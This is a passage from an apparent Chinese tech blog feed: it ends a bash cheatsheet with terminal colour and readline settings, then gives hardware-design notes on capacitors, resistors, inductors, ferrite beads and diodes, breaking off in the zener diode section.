<span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span><br>            pygmentize -P style=<span class="hljs-variable">$style</span> -P tabsize=4 -f terminal256 -g <span class="hljs-string">&quot;<span class="hljs-variable">$NAME</span>&quot;</span><br>        <span class="hljs-keyword">done</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="好玩的配置"><a href="#好玩的配置" class="headerlink" title="好玩的配置"></a>好玩的配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 放到你的 ~/.bashrc 配置文件中，给 man 增加漂亮的色彩高亮</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_mb=$<span class="hljs-string">&#x27;\E[1m\E[32m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_mh=$<span class="hljs-string">&#x27;\E[2m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_mr=$<span class="hljs-string">&#x27;\E[7m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_md=$<span class="hljs-string">&#x27;\E[1m\E[36m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_ZW=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_us=$<span class="hljs-string">&#x27;\E[4m\E[1m\E[37m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_me=$<span class="hljs-string">&#x27;\E(B\E[m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_ue=$<span class="hljs-string">&#x27;\E[24m\E(B\E[m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_ZO=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_ZN=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_se=$<span class="hljs-string">&#x27;\E[27m\E(B\E[m&#x27;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_ZV=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">export</span> LESS_TERMCAP_so=$<span class="hljs-string">&#x27;\E[1m\E[33m\E[44m&#x27;</span><br><br><span class="hljs-comment"># ALT+hjkl/HJKL 快速移动光标，将下面内容添加到 ~/.inputrc 中可作用所有工具，</span><br><span class="hljs-comment"># 包括 bash/zsh/python/lua 等使用 readline 的工具，帮助见：info rluserman</span><br><span class="hljs-string">&quot;\eh&quot;</span>: backward-char<br><span class="hljs-string">&quot;\el&quot;</span>: forward-char<br><span class="hljs-string">&quot;\ej&quot;</span>: next-history<br><span class="hljs-string">&quot;\ek&quot;</span>: previous-history<br><span class="hljs-string">&quot;\eH&quot;</span>: backward-word<br><span class="hljs-string">&quot;\eL&quot;</span>: forward-word<br><span class="hljs-string">&quot;\eJ&quot;</span>: beginning-of-line<br><span class="hljs-string">&quot;\eK&quot;</span>: end-of-line<br></code></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://github.com/skywind3000/awesome-cheatsheets/blob/master/languages/bash.sh">https://github.com/skywind3000/awesome-cheatsheets/blob/master/languages/bash.sh</a><br><a href="https://github.com/Idnan/bash-guide">https://github.com/Idnan/bash-guide</a><br><a href="http://www.linuxstall.com/linux-command-line-tips-that-every-linux-user-should-know/">http://www.linuxstall.com/linux-command-line-tips-that-every-linux-user-should-know/</a><br><a href="https://ss64.com/bash/syntax-keyboard.html">https://ss64.com/bash/syntax-keyboard.html</a><br><a href="http://wiki.bash-hackers.org/commands/classictest">http://wiki.bash-hackers.org/commands/classictest</a><br><a href="https://www.ibm.com/developerworks/library/l-bash-test/index.html">https://www.ibm.com/developerworks/library/l-bash-test/index.html</a><br><a href="https://www.cyberciti.biz/faq/bash-loop-over-file/">https://www.cyberciti.biz/faq/bash-loop-over-file/</a><br><a href="https://linuxconfig.org/bash-scripting-tutorial">https://linuxconfig.org/bash-scripting-tutorial</a><br><a href="https://github.com/LeCoupa/awesome-cheatsheets/blob/master/languages/bash.sh">https://github.com/LeCoupa/awesome-cheatsheets/blob/master/languages/bash.sh</a><br><a href="https://devhints.io/bash">https://devhints.io/bash</a><br><a href="https://github.com/jlevy/the-art-of-command-line">https://github.com/jlevy/the-art-of-command-line</a><br><a href="https://yq.aliyun.com/articles/68541">https://yq.aliyun.com/articles/68541</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>shell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>硬件基础</title>
    <link href="/2023/12/01/%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/12/01/%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>总结硬件设计中的知识点</p><span id="more"></span><h1 id="基本元器件-电容"><a href="#基本元器件-电容" class="headerlink" title="基本元器件 - 电容"></a>基本元器件 - 电容</h1><h2 id="基本分类"><a href="#基本分类" class="headerlink" title="基本分类"></a>基本分类</h2><p>玻璃电容：使用玻璃作为介质的电容器，具有高温稳定性和低损耗等特点，常用于高频和高温环境下的电路中。</p><p>钽电容：使用钽金属作为电极的电容器，具有小尺寸、大电容量和高频特性等优点，常用于微型电路中。</p><p>薄膜电容：使用金属膜或金属箔作为电极的电容器，具有高精度、稳定性好等特点，常用于高性能电子器件中。</p><p>铝电解电容：使用铝箔和电解液作为电极的电容器，具有大电容量、低成本等特点，常用于低频和直流电路中。<strong>这种电容最后不要使用。</strong></p><p>云母电容：使用云母作为介质的电容器，具有高精度、高频特性等特点，常用于精密仪器和高频电路中。</p><p>空气电容：使用空气作为介质的电容器，具有高精度、稳定性好等特点，但体积较大，常用于高频和高压电路中。</p><p>陶瓷电容：使用陶瓷作为介质的电容器，具有小尺寸、高频特性和高温稳定性等优点，常用于电子设备中。</p><p>可调电容：具有可变电容值的电容器，常用于无线电和调谐电路中。</p><p>金属纸电容：使用金属化薄膜作为电极的电容器，具有高精度、稳定性好等特点，常用于高性能电子器件中。</p><p>超级电容：也称为电化学电容器，具有高能量密度、高功率密度和长寿命等特点，常用于储能系统和电动汽车中。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403010053086.png"></p><h2 id="单位换算"><a href="#单位换算" class="headerlink" title="单位换算"></a>单位换算</h2><p>$$1F&#x3D;1\cdot10^3mF&#x3D;1\cdot10^6\mu F&#x3D;1\cdot10^9nF&#x3D;1\cdot10^{12}pF$$</p><h2 id="电容的选型"><a href="#电容的选型" class="headerlink" title="电容的选型"></a>电容的选型</h2><ul><li><strong>耐压值</strong>：降额使用，3.3V 选 10V，5V 选 10V，12V 选 25V，24V 选 50V，48V 选 100V</li></ul><h2 id="电容的材质分类"><a href="#电容的材质分类" class="headerlink" title="电容的材质分类"></a>电容的材质分类</h2><table><thead><tr><th align="center"></th><th align="center">铝电解电容</th><th align="center">钽电容</th><th align="center">陶瓷电容</th></tr></thead><tbody><tr><td align="center">电容量</td><td align="center">0.1uF-3F</td><td align="center">0.1uF-1000uF</td><td align="center">0.5pF-100uF</td></tr><tr><td align="center">极性</td><td align="center">有</td><td align="center">有</td><td align="center">无</td></tr><tr><td align="center">耐压</td><td align="center">5V-500V</td><td align="center">2V-50V</td><td align="center">2V-1000V</td></tr><tr><td align="center">ESR</td><td align="center">几十毫欧 -2.5 欧姆 （100KHZ&#x2F;25℃）</td><td align="center">几十毫欧-几百毫欧（100KHZ&#x2F;25℃）</td><td align="center">几毫欧-几百毫欧（100KHZ&#x2F;25℃）</td></tr><tr><td align="center">ESL</td><td align="center">不超过 100nH</td><td align="center">2nH 左右</td><td align="center">1-2nH</td></tr><tr><td align="center">工作频率范围</td><td align="center">低频滤波，小于 600KHz</td><td align="center">中低频滤波，几百 KHZ-几 MHz</td><td align="center">高频滤波，几 MHZ-几 GHz</td></tr><tr><td align="center">薄弱点</td><td align="center">窄温度范围，电解液会挥发，纹波电流导致发热</td><td align="center">必须降额使用，否则失效会爆炸</td><td align="center">焊接温度冲击容易导致失效，抗弯曲能力较差，不同材料温度特性差异巨大</td></tr><tr><td align="center">建议</td><td align="center">用于储能，低于 75℃ 环境，不建议用于高频开关电源</td><td align="center">耐压按２倍选择；15V 以上直流电压滤波不建议使用，特别是电源变化较快的场合，浪涌冲击失效显著</td><td align="center">布线不要放在应力区，避开高温区域。</td></tr></tbody></table><h2 id="电容的用途"><a href="#电容的用途" class="headerlink" title="电容的用途"></a>电容的用途</h2><h3 id="滤波"><a href="#滤波" class="headerlink" title="滤波"></a>滤波</h3><p>滤除杂波。大电容滤低频，小电容滤高频。</p><h3 id="去耦-旁路"><a href="#去耦-旁路" class="headerlink" title="去耦 &#x2F; 旁路"></a>去耦 &#x2F; 旁路</h3><p>简单地说，旁路靠近电源，去耦靠近芯片。</p><p>去耦 &#x2F; 旁路电容的作用是将系统中的高频噪声旁路到 GND，一般是在电源引脚与 GND 间并联小容值电容（典型为 0.1uF），用来滤除高频噪声，使电压稳定干净。</p><p>去耦与旁路电容的区别的，去耦电容是用于滤除输出信号的干扰（例如稳压器的输出引脚），而旁路电容是用于滤除输入信号的干扰（例如单片机的电源引脚）。去耦电容一般比较大（10uF 以上），而旁路电容一般根据谐振频率选定（0.1&#x2F;0.01uF）。</p><h3 id="调谐"><a href="#调谐" class="headerlink" title="调谐"></a>调谐</h3><p>调谐电容用于调节振荡电路的频率，使其与另一个正在发生振荡的电路谐振。</p><h3 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h3><p>耦合电容的作用是阻直通交，电容与其后面的负载形成滤波器，滤除了低频信号，保留了高频信号，形成一个高通滤波器。</p><p>耦合电容用于连接两个电路，只允许交流信号通过给电容充放电，传输到下一级电路。</p><h3 id="储能"><a href="#储能" class="headerlink" title="储能"></a>储能</h3><p>储能电容用于收集电荷，储能并使用。</p><h2 id="电容选用注意事项"><a href="#电容选用注意事项" class="headerlink" title="电容选用注意事项"></a>电容选用注意事项</h2><p>注意耐压值，有极性的电容不可反接。</p><h2 id="PCB放置注意事项"><a href="#PCB放置注意事项" class="headerlink" title="PCB放置注意事项"></a>PCB放置注意事项</h2><ul><li>耦合电容在放置上需要靠近电源</li></ul><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li>《硬件十万个为什么-无源器件篇》</li><li><a href="https://blog.csdn.net/ima_xu/article/details/85008406">360° 详解去耦电容，真正的理解及在真正工程中的使用！</a></li><li><a href="https://mp.weixin.qq.com/s/HUWal1ooXUn9PYKf89oGSQ">电源大师课连载（2）| 你不知道的电阻、电容小事儿</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-电阻"><a href="#基本元器件-电阻" class="headerlink" title="基本元器件 - 电阻"></a>基本元器件 - 电阻</h1><h2 id="电阻的选型"><a href="#电阻的选型" class="headerlink" title="电阻的选型"></a>电阻的选型</h2><p>一般来说，要考虑以下四个因素：</p><ul><li><strong>阻值</strong>：根据具体应用电路的需要而定</li><li><strong>精度</strong>：通常为 1%，如果用于电流检测回路（Rsense），通常低阻值大功率更高精度</li><li><strong>额定功率</strong>：满足 50% 降额，不同封装对应功率请见下表</li><li><strong>尺寸</strong>：尺寸与功率相关，应考虑功率和加工难度而定</li><li><strong>工作温度、湿度等</strong>：特定时候需要考虑的因素</li><li><strong>温漂</strong>：如果用于高精度（传感器应用），则必须考虑</li></ul><h2 id="贴片封装的参数"><a href="#贴片封装的参数" class="headerlink" title="贴片封装的参数"></a>贴片封装的参数</h2><table><thead><tr><th align="center">英制</th><th align="center">公制</th><th align="center">长 (mm)</th><th align="center">宽 (mm)</th><th align="center">高 (mm)</th><th align="center">额定功率 (W)</th><th align="center">耐压 (V)</th></tr></thead><tbody><tr><td align="center">0201</td><td align="center">0603</td><td align="center">0.60±0.05</td><td align="center">0.30±0.05</td><td align="center">0.23±0.05</td><td align="center">1&#x2F;20</td><td align="center">25</td></tr><tr><td align="center">0402</td><td align="center">1005</td><td align="center">1.00±0.10</td><td align="center">0.50±0.10</td><td align="center">0.30±0.10</td><td align="center">1&#x2F;16</td><td align="center">50</td></tr><tr><td align="center">0603</td><td align="center">1608</td><td align="center">1.60±0.15</td><td align="center">0.80±0.15</td><td align="center">0.40±0.10</td><td align="center">1&#x2F;10</td><td align="center">50</td></tr><tr><td align="center">0805</td><td align="center">2012</td><td align="center">2.00±0.20</td><td align="center">1.25±0.15</td><td align="center">0.50±0.10</td><td align="center">1&#x2F;8</td><td align="center">150</td></tr><tr><td align="center">1206</td><td align="center">3216</td><td align="center">3.20±0.20</td><td align="center">1.60±0.15</td><td align="center">0.55±0.10</td><td align="center">1&#x2F;4</td><td align="center">200</td></tr><tr><td align="center">1210</td><td align="center">3225</td><td align="center">3.20±0.20</td><td align="center">2.50±0.20</td><td align="center">0.55±0.10</td><td align="center">1&#x2F;3</td><td align="center">200</td></tr><tr><td align="center">1812</td><td align="center">4832</td><td align="center">4.50±0.20</td><td align="center">3.20±0.20</td><td align="center">0.55±0.10</td><td align="center">1&#x2F;2</td><td align="center">200</td></tr><tr><td align="center">2010</td><td align="center">5025</td><td align="center">5.00±0.20</td><td align="center">2.50±0.20</td><td align="center">0.55±0.10</td><td align="center">3&#x2F;4</td><td align="center">200</td></tr><tr><td align="center">2512</td><td align="center">6432</td><td align="center">6.40±0.20</td><td align="center">3.20±0.20</td><td align="center">0.55±0.10</td><td align="center">1</td><td align="center">200</td></tr></tbody></table><h2 id="电阻的阻值"><a href="#电阻的阻值" class="headerlink" title="电阻的阻值"></a>电阻的阻值</h2><h3 id="丝印表示方法"><a href="#丝印表示方法" class="headerlink" title="丝印表示方法"></a>丝印表示方法</h3><ul><li><strong>三位数标注法</strong>：$XXY &#x3D; XX * 10^Y$<ul><li>例如，丝印为 272 的电阻，实际阻值为 $27 * 10^2&#x3D;27 * 100&#x3D;2.7k$</li></ul></li><li><strong>四位数标注法</strong>：$XXXY &#x3D; XXX * 10^Y$</li><li><strong>字母表示小数点位置法</strong>：<code>R</code> 表示小数点。<ul><li>例如，丝印为 5R6 的电阻，实际阻值为 5.6 Ω</li><li><code>M</code> <code>k</code> <code>m</code> 也都可以表示小数点，分别代表 <code>MΩ</code> <code>kΩ</code> <code>mΩ</code></li></ul></li><li><strong>三位数乘数代码标注法</strong>：<code>XXY</code> 中，<code>XX</code> 表示有效数的代码，<code>Y</code> 指是 10 的多少次幂，可参考下方的标准电阻取值表<ul><li>例如，丝印为 01C 的电阻，实际阻值为 $100*10^2&#x3D;10 kΩ$</li></ul></li></ul><h3 id="标准电阻取值"><a href="#标准电阻取值" class="headerlink" title="标准电阻取值"></a>标准电阻取值</h3><p>根据约定俗成的优先数规范，一般比较多使用的是 E96 系列，其阻值与乘数代码表如下：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210704112625.png"></p><h2 id="电阻的失效"><a href="#电阻的失效" class="headerlink" title="电阻的失效"></a>电阻的失效</h2><p>按可能发生的几率排行，分别是：</p><ul><li><strong>开路</strong>：电阻膜缺陷或退化；瞬时功率过大冲击时可能导致</li><li><strong>阻值漂移超规范</strong>：老化后有可能发生</li><li><strong>引脚断裂</strong>：焊接工艺缺陷、焊点污染；插件电阻引脚反复弯曲时可能发生</li><li><strong>烧毁</strong>：长时间工作在额定功率以上，有可能烧毁导致开路</li><li><strong>焊接问题</strong>：虚焊等问题</li><li><strong>断线开路</strong>：受机械应力或瞬时过功率冲击时可能发生</li></ul><h2 id="0-欧姆电阻的使用"><a href="#0-欧姆电阻的使用" class="headerlink" title="0 欧姆电阻的使用"></a>0 欧姆电阻的使用</h2><ul><li>当跳线用，跨过布不下线的区域</li><li>作为短接座用</li><li>单点连接数字地和模拟地（有时也用电感或磁珠）</li><li>预留阻值用于调试</li></ul><p>不同封装的 0 欧电阻过电流能力（一般以额定电流降额 50% 使用）：</p><table><thead><tr><th align="center">封装</th><th align="center">额定电流（最大电流）&#x2F;A</th></tr></thead><tbody><tr><td align="center">0201</td><td align="center">0.5（1）</td></tr><tr><td align="center">0402</td><td align="center">1（2）</td></tr><tr><td align="center">0603</td><td align="center">2（3）</td></tr><tr><td align="center">0805 及以上</td><td align="center">2（5）</td></tr></tbody></table><h2 id="电阻的使用场景"><a href="#电阻的使用场景" class="headerlink" title="电阻的使用场景"></a>电阻的使用场景</h2><h3 id="分压电路"><a href="#分压电路" class="headerlink" title="分压电路"></a>分压电路</h3><p>将电阻串联以分压，其电路特点是：</p><ul><li>通过各电阻的电流是同一电流，即各电阻中的电流相等，即 $I &#x3D; I_1 &#x3D; I_2 &#x3D; I_3$</li><li>总电压等于各电阻上的电压降之和，即 $V&#x3D; V_1 + V_2 + V_3$</li><li>总电阻等于各电阻之和，即 $R&#x3D;R_1 + R_2 +R_3$</li></ul><p>举个例子，电源稳压器的反馈引脚，一般接就是由两个电阻组成的分压电路，通过分压得到与内部参考电压接近的输出电压值。</p><h3 id="分流电路"><a href="#分流电路" class="headerlink" title="分流电路"></a>分流电路</h3><p>将电阻并联以分流，其电路特点是：</p><ul><li>各支路两端电压相等</li><li>总电流等于各支路电流之和，即 $I&#x3D; I_1 + I_2 + I_3$</li><li>总电阻的倒数等于各支路倒数之和，即 $\frac{1}{R}&#x3D;\frac{1}{R_1}+\frac{1}{R_2}+\frac{1}{R_3}$</li></ul><p>在实际电路设计中，多用于并联在三极管的集电极与发射极之间，作为保护电阻；在一些线性电源稳压器功率不够的场合，也可以在输入端与输出端之间病来你电阻，以提高输出电流。</p><h3 id="限流电路"><a href="#限流电路" class="headerlink" title="限流电路"></a>限流电路</h3><p>一般用于 LED 的限流。将电阻串联进 LED 所在的电路，以 LED 的导通压降（一般为 0.7 V）和 LED 额定电流，来确定阻值。需要注意的是，一般计算出来的实际工作电流，要小于 LED 的额定工作电流。</p><p>限流电路也可以用于热插拔电路。</p><h3 id="阻抗匹配电路"><a href="#阻抗匹配电路" class="headerlink" title="阻抗匹配电路"></a>阻抗匹配电路</h3><p>阻抗匹配的目的，是为了让负载获得最大功率，即负载电阻等于信号源电阻。推导过程如下：</p><p>假设负载电阻为 R，电源电动势为 U，内阻为 r，则通过 R 的电流为：</p><p>$$<br>I&#x3D;\frac{U}{R+r}<br>$$</p><p>可以看出，R 越小，则电流越大。而 R 两端的电压为：</p><p>$$<br>U_R&#x3D;IR&#x3D;\frac{U}{1+\frac{r}{R}}<br>$$</p><p>R 越大，则输出电压 $U_R$ 越大。R 的功率为：</p><p>$$<br>P&#x3D;I^2R&#x3D;(\frac{U}{R+r})^2R&#x3D;\frac{U^2R}{R^2+r^2+2Rr}&#x3D;\frac{U^2}{\frac{(R-r)^2}{R}+\frac{4Rr}{R}}<br>$$</p><p>因为 r 不变，所以当 R&#x3D;r 时，$\frac{(R-r)^2}{R}&#x3D;0$，此时可获得最大功率 $P_{max}&#x3D;\frac{U^2}{4r}$</p><h3 id="RC-充放电电路"><a href="#RC-充放电电路" class="headerlink" title="RC 充放电电路"></a>RC 充放电电路</h3><p>$\tau&#x3D;RC$（若 R 和 C 的单位为 Ω 和 F，则结果的单位为 s。</p><p>RC 电路可视为延时电路或滤波电路，将脉冲信号上升下降沿都进行了滤波，使其变得平缓，可以通过调整 R、C 值，以实现不同上升时间。</p><h3 id="上下拉电路"><a href="#上下拉电路" class="headerlink" title="上下拉电路"></a>上下拉电路</h3><p>上拉是将不确定的信号通过电阻钳制在高电平（同时也起限流作用）；下拉反之。</p><p>一般来说，50 Ω 以下的电阻为强上 &#x2F; 下拉，100 kΩ 以上的电阻为弱上 &#x2F; 下拉。</p><h3 id="其他电路"><a href="#其他电路" class="headerlink" title="其他电路"></a>其他电路</h3><ul><li>运算放大器外围电路</li><li>抗干扰电路，提高抗浪涌电压能力</li><li>负载电路（防止电路空载）</li></ul><h2 id="参考与致谢-1"><a href="#参考与致谢-1" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li>《硬件十万个为什么-无源器件篇》</li><li><a href="http://www.fxdzw.com/rmjb/%E8%B4%B4%E7%89%87%E7%94%B5%E9%98%BB%E5%B0%81%E8%A3%85%E3%80%81%E5%B0%BA%E5%AF%B8%E3%80%81%E5%8A%9F%E7%8E%87%E5%AF%B9%E5%BA%94%E8%A1%A8.pdf">贴片电阻封装、尺寸、功率对应表</a></li><li><a href="https://mp.weixin.qq.com/s/HUWal1ooXUn9PYKf89oGSQ">电源大师课连载（2）| 你不知道的电阻、电容小事儿</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-电感与磁珠"><a href="#基本元器件-电感与磁珠" class="headerlink" title="基本元器件 - 电感与磁珠"></a>基本元器件 - 电感与磁珠</h1><h2 id="电感"><a href="#电感" class="headerlink" title="电感"></a>电感</h2><h3 id="电感的选型"><a href="#电感的选型" class="headerlink" title="电感的选型"></a>电感的选型</h3><ul><li>体积大小</li><li>电感值所在工作频率</li><li>开关频率下的电感值为实际需要的电感值</li><li>线圈的直流阻抗（DCR）越小越好</li><li>工作电流应降额至额定饱和电流的 0.7 倍以下，额定 rms 电流；</li><li>交流阻抗（ESR）越小越好；</li><li>Q 因子越大越好；</li><li>屏蔽类型：屏蔽式或非屏蔽式，优先选择屏蔽式。</li><li>工作频率和绕组电压不可降额；</li><li>品牌：贴片电感优选 TDK、MURATA（村田）、三礼、SUMIDA（胜<br>美达）</li></ul><h2 id="电感的关键参数"><a href="#电感的关键参数" class="headerlink" title="电感的关键参数"></a>电感的关键参数</h2><h4 id="感值-L"><a href="#感值-L" class="headerlink" title="感值 L"></a>感值 L</h4><p>一般误差有 10% 或 20%（测试条件是 1MHz 频率）。</p><p>感值大小区别：</p><ul><li>小感值：低 DCR，高饱和电流，更好的动态，更大的纹波电流。</li><li>大感值：小纹波电流。</li></ul><h4 id="直流电阻-DCR"><a href="#直流电阻-DCR" class="headerlink" title="直流电阻 DCR"></a>直流电阻 DCR</h4><p>可以理解为寄生参数，和电感的封装大小以及感值有很大关系，选型时最好选择较小 DCR 的电感。</p><p>感值、尺寸与 DCR 的关系：</p><ul><li>电感感值相同，尺寸越小，DCR 越大。</li><li>电感尺寸相同，感值越大，DCR 越大。</li><li>电感感值相同，有磁屏蔽的电感，DCR 小于没有磁屏蔽的电感。</li></ul><h4 id="自谐振频率-SRF"><a href="#自谐振频率-SRF" class="headerlink" title="自谐振频率 SRF"></a>自谐振频率 SRF</h4><p>因为电感寄生电容的存在，会发生 LC 振荡，和电容一样，只有在特定的频率下，才能发挥电感的特性。<br>按照经验值，SRF 一般是信号频率的 10 倍，此时的电感特性发挥的比较好。</p><h4 id="电感饱和电流-Isat"><a href="#电感饱和电流-Isat" class="headerlink" title="电感饱和电流 Isat"></a>电感饱和电流 Isat</h4><p>电感感值下降 30% 时所容许通过的直流电流。</p><h4 id="电感温升电流-Irms"><a href="#电感温升电流-Irms" class="headerlink" title="电感温升电流 Irms"></a>电感温升电流 Irms</h4><p>在 20℃ 环境下，电感温度上升 40℃ 所容许通过的直流电流。</p><p>一般取 Isat 和 Irms 中较小的一个值作为电感的额定电流，且此额定电流应是电路中最大输出电流的 1.3 倍，留有一定的余量，降额使用。</p><h3 id="磁屏蔽特性"><a href="#磁屏蔽特性" class="headerlink" title="磁屏蔽特性"></a>磁屏蔽特性</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210723134135.png"></p><p>一般情况下，屏蔽特性：工字型 ＜ 半屏蔽型 ＜ 一体成型。</p><h2 id="磁珠"><a href="#磁珠" class="headerlink" title="磁珠"></a>磁珠</h2><p>磁珠是一种电感型 EMI 静噪滤波器，实物和电感很像，其等效模型可以简化为一个电感和一个电阻串联。磁珠的单位是欧姆，根据型号的不同，可以抑制几 MHz-GHz 的噪声，经常被用在信号线和电源线上（串联使用）。</p><p>磁珠的单位是欧姆（Ω），电感单位是亨（H）。磁珠由氧磁体组成，电感由磁芯和线圈组成，磁珠把交流信号转化为热能，电感把交流存储起来，缓慢的释放出去，所以说电感是储能，而磁珠是能量转换（消耗）器件。</p><p>磁珠主要解决辐射干扰问题，信号线上多用磁珠，某一些高频电路如 RF、振荡电路、DDR SDRAM 等都需要在电源输入部分加磁珠；电感主要解决传导干扰问题，高频电感主要用于中低频滤波电路、RF 匹配等，功率电感主要用于 DC-DC 电路中。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281936827.png"></p><p>从上图可以看出，通过一个磁珠来将数字电源和模拟电源隔离开来。有时候需要使用0欧姆电阻来替代磁珠，这是因为：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281943122.png"></p><h3 id="磁珠的主要参数"><a href="#磁珠的主要参数" class="headerlink" title="磁珠的主要参数"></a>磁珠的主要参数</h3><ul><li><strong>阻抗 Z</strong>：阻抗越大，抑制噪声的效果越好。（一般测试条件为 100 MHz）</li><li><strong>直流电阻 DCR</strong>：指直流电流通过磁珠时，磁珠呈现的电阻值。DCR 一般越小越好，对有用信号的衰减越小。</li><li><strong>额定电流 Rated Current</strong>：指磁珠正常工作时允许的最大电流。</li></ul><h2 id="参考与致谢-2"><a href="#参考与致谢-2" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://mp.weixin.qq.com/s/d0rs7d7HB1IaxVe6KhHV2g">电感如何选型？</a></li><li>《硬件十万个为什么-无源器件篇》</li><li><a href="https://mp.weixin.qq.com/s/3b5ImnLcfIQbvO-lG-h7PQ">关于磁珠的 6 个问题，你能接住吗？</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-二极管"><a href="#基本元器件-二极管" class="headerlink" title="基本元器件 - 二极管"></a>基本元器件 - 二极管</h1><p>伏安特性：</p><ul><li>导通后分电压值约为 0.7 V（LED 约为 1-2 V，电流 5-20 mA）。</li><li>反向不导通，但如果达到反向击穿电压，那将导通（超过反向最大电压可能烧坏）。</li><li>正向电压很小时不导通（0.5 V 以上时才导通）。</li></ul><h2 id="二极管的主要参数"><a href="#二极管的主要参数" class="headerlink" title="二极管的主要参数"></a>二极管的主要参数</h2><ul><li>**最大整流电流 $I_F$**：表示长期运行允许的最大正向平均电流，超出可能因结温过高烧坏。</li><li>**最高反向工作电压 $U_R$**：允许施加的最大反向电压，超出可能击穿。（$U_R$ 通常为击穿电压的一半）</li><li>**反向电流 $I_R$**：未击穿时的反向电流，越小导电性越好。</li><li>**最高工作频率 $f_M$**：上线截止频率。因结电容作用，超出可能不能很好体现的单向导电性。</li></ul><h2 id="二极管的分类"><a href="#二极管的分类" class="headerlink" title="二极管的分类"></a>二极管的分类</h2><p>类型：</p><ul><li><strong>整流管</strong><ul><li><strong>普通二极管</strong>：恢复速度相对慢，不适用于高频电路</li><li><strong>快恢复二极管</strong></li><li><strong>肖特基二极管</strong>：应用于 &lt;200V 的场景</li></ul></li><li><strong>稳压管</strong>：持续击穿，应用于低功率场景<ul><li><strong>TVS</strong>：瞬间击穿，应用于高功率场景</li></ul></li></ul><h3 id="整流二极管"><a href="#整流二极管" class="headerlink" title="整流二极管"></a>整流二极管</h3><p>用途：利用单向导通性，把交流电变成脉动直流电。</p><h3 id="快恢复二极管（FRD）"><a href="#快恢复二极管（FRD）" class="headerlink" title="快恢复二极管（FRD）"></a>快恢复二极管（FRD）</h3><p>快速恢复二极管的结构和功能与整流二极管相同。整流二极管用于 500 Hz 以下的低频应用，而 FRD 则用于从几千赫兹到 100 kHz 的高频开关。因此，FRD 具有反向恢复时间（trr）很短的特性，这对高速开关非常重要。一般整流二极管的 trr 为几微秒到几十微秒；而 FRD 的 trr 是几十毫微秒到几百毫微秒，约为整流二极管的 1&#x2F;100。它应用于开关电源、逆变器、DC&#x2F;DC 转化器等。</p><h3 id="稳压（齐纳）二级管"><a href="#稳压（齐纳）二级管" class="headerlink" title="稳压（齐纳）二级管"></a>稳压（齐纳）二级管</h3><p>定义：能稳定一定电压的二极管。</p><p>稳压二极管利用了 PN 结的反向特性。持续击穿，并得到恒定的电压，应用于低功率场景。</p><p>稳压条件：</p><ol><li>工作在反向击穿状态下</li><li>反向电压大于稳压电压</li></ol><p>稳压二级管的参数</p><ul><li>**稳定电压 $U_Z$**：表示在规定电流下的反向击穿电压，对于同一型号的稳压管，稳定电压是确定值。</li><li>**反向电流 $I_Z$**：工作在稳压态下的参考电流，电流低于此值时稳压效果变差，也称 ${I_Z}_{min}$。</li><li>**额定功耗 $P_{ZM}$**：等于稳定电压 $U_Z$ 与最大稳定电流 